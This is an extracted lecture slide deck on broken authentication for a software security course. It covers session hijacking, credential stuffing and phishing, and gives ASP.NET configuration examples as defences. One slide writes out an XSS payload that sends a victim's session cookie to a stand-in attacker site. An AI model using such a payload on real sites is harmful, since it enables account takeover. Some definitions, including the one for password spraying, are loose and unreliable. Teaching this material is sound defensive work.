@@ -1,0 +1,536 @@
+--- Page 1 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Broken Authentication
+By: Dr. Khairunnisa bt Osman
+Subject: Software Security (CCSB5133)
+Sem 2 (2025/2026)
+
+--- Page 2 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Outline
+▪ What are Authentication, Authorization?
+▪ Why is authentication important in cybersecurity?
+▪ What Is Broken Authentication?
+▪ Categories vulnerabilities of broken authentication
+▪ Addressing Broken Authentication Vulnerabilities
+▪ Summary
+▪
+
+--- Page 3 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+What is an Authentication?
+Authentication is the process of
+verifying that you are who you
+say you are by passing these
+credentials you provide
+(username and password) across
+the identity and directory
+systems.
+
+--- Page 4 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+What is an Authorization?
+An authorization is the process
+of giving someone permission to
+do or have something. The
+system administrator specifies
+which users have access to the
+system and what privileges each
+user has.
+
+--- Page 5 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Authentication and Authorization Diagram
+
+--- Page 6 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Authentication Factors
+Something you have
+Users verify their identity
+with a unique object such
+as an access card or key
+fob. This authentication
+removes the risk of
+forgetting passwords;
+however, it means the
+user must have the object
+with them whenever they
+need to access a system,
+and they run the risk of
+losing it by accident or
+theft.
+Something you
+know
+This is the most common
+authentication factor. It
+verifies identity by
+confirming users through
+confidential information
+they have, such as a login
+and password.
+Something you are
+An inherence factor
+verifies identity through
+inherent biometric
+characteristics of the
+user—like a fingerprint,
+voice, or iris pattern. The
+advantage of biometric
+authentication is that
+they’re harder to lose or
+replicate. But they can be
+expensive and less
+accurate than traditional
+authentication factors.
+
+--- Page 7 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+What Is Broken Authentication? (I)
+A broken authentication refers to the vulnerabilities or weaknesses inherent in an
+online platform or application that allows hackers to bypass the login security and
+gain access to all the privileges owned by the hacked user.
+There are two main categories of vulnerabilities causes broken authentication:
+
+--- Page 8 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+(1) Session Management Vulnerabilities (I)
+Basically, a session ID is created and assigned to a user whenever they log in to a site.
+The session ID is used to track what the user does and helps the site respond to the
+user’s actions.
+
+--- Page 9 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+(1) Session Management Vulnerabilities (II)
+If an attacker can get a hold of a user’s session ID while they are logged in, then that
+is essentially as good as having their password. They can use the stolen session ID to
+impersonate the user and perform actions within the website.
+
+--- Page 10 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+(2) Credential Management Vulnerabilities
+▪ The theft of usernames and passwords is the first thing that usually comes to mind
+when we think of attackers gaining unauthorized access to an application. Proper
+credential management is critical for the users of any system, and applications
+themselves must take all possible precautions when dealing with passwords and their
+creation.
+▪ In this case, broken authentication occurs when a site fails to protect its users from
+attackers that try to gain access via hacked or stolen passwords.
+
+--- Page 11 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Examples of Broken Authentication (I)
+02 03 0401 05
+Password Spraying
+Credential Stuffing
+Session Hijacking
+Session ID URL
+Phishing Attacks
+Broken Authentication
+
+--- Page 12 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+(1) Password Spraying (I)
+• The term "password spraying" refers to the use of simple and weak passwords, such
+as "12345" or "password," by attackers attempting to breach secure accounts.
+• Password-complexity requirements help protect against Password Spraying. You can
+see some of the most commonly used (and therefore worst) passwords below:
+
+--- Page 13 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+(1) Password Spraying (II)
+The most password used
+
+--- Page 14 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+(2) Credential Stuffing (I)
+Credential stuffing is a type of cyberattack where stolen account credentials typically
+consisting of lists of usernames and/or email addresses and the corresponding
+passwords (often from a data breach) are used to gain unauthorized access to user
+accounts through large-scale automated login requests directed against a web
+application.
+
+--- Page 15 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+(2) Credential Stuffing (II)
+Credential Stuffing Diagram
+
+--- Page 16 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+(3) Session Hijacking (I)
+Session hijacking is an attack where a user session is taken over by an attacker. A
+session starts when you log into a service, for example your banking application,
+and ends when you log out. The attack relies on the attacker’s knowledge of your
+session cookie, so it is also called cookie hijacking or cookie side-jacking. Although
+any computer session could be hijacked, session hijacking most commonly applies
+to browser sessions and web applications.
+
+--- Page 17 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+(3) Session Hijacking (II)
+Example:
+An attackers may distribute emails or IM messages with a specially crafted link
+pointing to a known and trusted website but containing HTTP query parameters that
+exploit a known vulnerability to inject script code. For an XSS attack used for session
+hijacking, the code might send the session key to the attacker’s own website, for
+instance:,
+http://www.TrustedSearchEngine.com/search?<script>location.href='http://www.Se
+cretVillainSite.com/hijacker.php?cookie='+document.cookie;</script>
+This would read the current session cookie using document.cookie and send it to the
+attacker’s website by setting the location URL in the browser using location.href.
+
+--- Page 18 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+(3) Session Hijacking (III)
+Illustration of session hijacking using XSS
+
+--- Page 19 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+(4) Session ID URL (I)
+When a user logs in to a website, the server generates a unique session ID and stores it
+in a cookie on the user's browser. This session ID is then appended to the end of the
+URL as a parameter, allowing the server to associate subsequent requests from the
+user with the correct session.
+
+--- Page 20 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+(4) Session ID URL (II)
+Session ID Example
+
+--- Page 21 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+(4) Session ID URL (II)
+• When a user visits an online store, the store server generates an individual session ID
+that is stored locally on the visitor's computer.
+• If the user leaves the shopping cart, the cookie is transmitted along with the request
+to ensure the session won't get lost.
+• The products in the shopping cart are also assigned to the session ID and stored in
+the session cookie.
+• Example of a URL with session ID attached as a parameter:
+https://www.example.com/index.php?sid=123454321abcde-54321dcba
+
+--- Page 22 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+(5) Phishing Attacks (I)
+A phishing attack is a category of cyber attack in which malicious actors send messages
+pretending to be a trusted person or entity. Phishing messages manipulate users,
+causing them to perform actions like installing malicious files, clicking harmful links, or
+divulging sensitive information such as account credentials. This message can be sent to
+the target via emails, messaging applications, or even SMS services.
+
+--- Page 23 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+(5) Phishing Attacks (II)
+Example of a phishing email
+
+--- Page 24 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Addressing Broken Authentication Vulnerabilities
+6
+7
+89
+5
+4
+3
+2
+1
+Implement Breached
+Password Protection Awareness
+
+--- Page 25 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+(1) Secure Password Storage (I)
+Secure password storage is an important aspect of web application security, as
+passwords are often the first line of defense against unauthorized access. There
+are several vulnerabilities that can arise when passwords are not stored securely,
+including:
+a. Plain-text password storage: This is the most basic vulnerability, where
+passwords are stored in plain text format, which can be easily read and accessed
+by anyone with access to the storage location.
+
+--- Page 26 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+(1) Secure Password Storage (II)
+b. Weak password hashing: Passwords
+are often hashed before being stored in
+a database, but if the hashing algorithm
+is weak, it can be vulnerable to attacks
+like brute force or dictionary attacks.
+
+--- Page 27 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+(1) Secure Password Storage (III)
+c. Inadequate salt usage: Salting is the
+process of adding a unique, random
+value to each password before it is
+hashed. If the salt is not unique or
+random enough, it can make it easier for
+attackers to crack passwords.
+
+--- Page 28 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+(1) Secure Password Storage (IV)
+d. Vulnerable password recovery mechanisms: Password recovery mechanisms,
+such as email password reset links, can be vulnerable to attacks if they are not
+properly secured. For example, if an attacker gains access to a user's email
+account, they can use the reset link to gain access to the user's account.
+e. Insider attacks: Insiders with access to the password storage system can pose a
+threat to password security. This includes employees or contractors who may
+abuse their access or accidentally leak information.
+
+--- Page 29 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+How to address the broken authentication?
+
+--- Page 30 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+(2) Don't Allow Weak Passwords (I)
+You must require all users to achieve specific requirements when specifying their
+passwords. For example, setting passwords to a particular length and requiring special
+characters and letters as well as numbers helps prevent credential theft. Consequently,
+your system will reject passwords that don't meet the requirements.
+
+--- Page 31 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+(2) Don't Allow Weak Passwords (II)
+Example : we can do this by modifying the IdentityOptions method like so:
+services.Configure<IdentityOptions>(options => {
+// Password settings
+options.Password.RequireDigit = true;
+options.Password.RequiredLength = 8;
+options.Password.RequireNonAlphanumeric = true;
+options.Password.RequireUppercase = true;
+options.Password.RequireLowercase = true;
+options.Password.RequiredUniqueChars = 6;
+});
+
+--- Page 32 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+(3) Add a Strict Credential Recovery Process
+This should involve several verification checks and steps that make it hard and costly for
+attackers to abuse.
+services.Configure<IdentityOptions>(options => {
+// Password settings
+options.Password.RequireDigit = true;
+options.Password.RequiredLength = 8;
+options.Password.RequireNonAlphanumeric = true;
+options.Password.RequireUppercase = true;
+options.Password.RequireLowercase = true;
+options.Password.RequiredUniqueChars = 6;
+options.Lockout.DefaultLockoutTimeSpan = TimeSpan.FromMinutes(30);
+options.Lockout.MaxFailedAccessAttempts = 10;
+options.SignIn.RequireConfirmedEmail = true;
+options.User.RequireUniqueEmail = true;
+});
+
+--- Page 33 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+(4) Implement Protection of Breached Password
+A breached password protection mechanism will lock the accounts of users whose
+passwords have been compromised. In addition, we can configure this mechanism
+to return access when users change their passwords. This way, we guarantee that
+the users have a chance to prevent damage if attackers steal their passwords.
+
+--- Page 34 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+(5) Regulate Session Length (I)
+All web applications must end user sessions after a certain period of inactivity. The length
+of this period depends on the type of application. For example, a streaming platform
+might require a long period of inactivity, while a sensitive banking website should have a
+short time limit.
+To regulate the length of a session, add the following lines to the project config file.
+
+--- Page 35 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+(5) Regulate Session Length (II)
+var builder = WebApplication.CreateBuilder(args);
+builder.Services.AddRazorPages();
+builder.Services.AddControllersWithViews();
+/// ADD THIS
+builder.Services.AddDistributedMemoryCache();
+/// ADD THIS
+builder.Services.AddSession(options =>
+{
+options.IdleTimeout =
+TimeSpan.FromSeconds(10);
+options.Cookie.HttpOnly = true;
+options.Cookie.IsEssential = true;
+});
+var app = builder.Build();
+if (!app.Environment.IsDevelopment())
+{
+app.UseExceptionHandler("/Error");
+app.UseHsts();
+}
+app.UseHttpsRedirection();
+app.UseStaticFiles();
+app.UseRouting();
+app.UseAuthorization();
+/// ADD THIS
+app.UseSession();
+app.MapRazorPages();
+app.MapDefaultControllerRoute();
+app.Run();
+Example
+
+--- Page 36 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+(6) Improve Session Management
+It's imperative that your platform provides individual session IDs after every successful
+authentication attempt. In addition, your system must invalidate old session IDs to
+prevent hijacking as soon as a session ends.
+
+--- Page 37 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+(7) Don't Use Session ID URLs
+In all cases, you must secure web URLs with SSL without including the session ID.
+
+--- Page 38 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+(8) Multifactor Authentication
+Multifactor authentication (MFA) is one of the most robust protection mechanisms at
+your disposal. MFA requires an additional credential to verify a user's identity. An
+example would be a one-time password (OTP) mailed or messaged to the user.
+
+--- Page 39 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+(9) Awareness
+It's vital to provide regular education for users about the potential risks of phishing
+attacks and weak passwords. Sending monthly or quarterly emails reminding users to be
+vigilant and cautious will usually suffice.
+
+--- Page 40 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Broken Authentication Testing Tools
+▪ WebGoat – Educational
+▪ Pentest-Tools.com – In Real World
+
+--- Page 41 ---
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Summary
+Broken Authentication is a security vulnerability when
+authentication methods are weak, easily guessable, or
+bypassable, or sensitive information is stored or transmitted
+in an insecure manner.
